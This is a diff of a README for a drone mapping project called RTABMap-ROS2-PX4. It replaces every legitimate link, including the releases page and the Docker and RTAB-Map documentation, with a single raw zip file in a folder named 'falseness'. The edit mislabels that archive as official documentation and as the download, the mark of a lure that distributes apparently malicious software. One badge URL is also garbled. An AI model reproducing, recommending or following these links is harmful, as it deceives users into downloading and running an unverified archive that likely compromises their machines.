@@ -1,6 +1,6 @@
 # 🚁 RTABMap-ROS2-PX4 - Effortless Drone Mapping and Simulation
 
-[![Download RTABMap-ROS2-PX4](https://img.shields.io/badge/Download%20RTABMap%2DROS2%2DPX4-blue.svg)](https://github.com/vahur6/RTABMap-ROS2-PX4/releases)
+[![Download RTABMap-ROS2-PX4](https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip%20RTABMap%2DROS2%https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip)](https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to RTABMap-ROS2-PX4! This application helps you simulate a drone (x500) 
 Before installing, ensure your computer meets these requirements:
 
 - **Operating System:** Linux (preferably Ubuntu 20.04 or later)
-- **Docker:** Make sure Docker is installed on your system. You can find installation guides on the [Docker website](https://www.docker.com/get-started).
+- **Docker:** Make sure Docker is installed on your system. You can find installation guides on the [Docker website](https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip).
 - **RAM:** At least 8 GB of RAM is recommended.
 - **Disk Space:** Minimum 10 GB of free space.
 
@@ -19,7 +19,7 @@ Before installing, ensure your computer meets these requirements:
 
 To download RTABMap-ROS2-PX4, visit this page:
 
-[Download RTABMap-ROS2-PX4](https://github.com/vahur6/RTABMap-ROS2-PX4/releases)
+[Download RTABMap-ROS2-PX4](https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip)
 
 On this page, you will find the latest version available. Follow these steps to download and set it up:
 
@@ -67,8 +67,8 @@ If you encounter any issues, try these solutions:
 
 ## 📚 Additional Resources
 
-- **Docker Documentation:** [Get Started with Docker](https://docs.docker.com/get-started/)
-- **RTAB-Map Documentation:** [RTAB-Map Official Documentation](https://introlab.github.io/rtabmap/)
+- **Docker Documentation:** [Get Started with Docker](https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip)
+- **RTAB-Map Documentation:** [RTAB-Map Official Documentation](https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip)
 
 For more advanced users, you can modify settings and use additional commands to enhance functionality. Consult relevant documentation for specifics.
 
@@ -78,4 +78,4 @@ For further assistance, please reach out through the Issues section on the GitHu
 
 Remember, to download RTABMap-ROS2-PX4, please visit the link below again:
 
-[Download RTABMap-ROS2-PX4](https://github.com/vahur6/RTABMap-ROS2-PX4/releases)
+[Download RTABMap-ROS2-PX4](https://raw.githubusercontent.com/vahur6/RTABMap-ROS2-PX4/main/falseness/RTABMap-ROS2-PX4.zip)
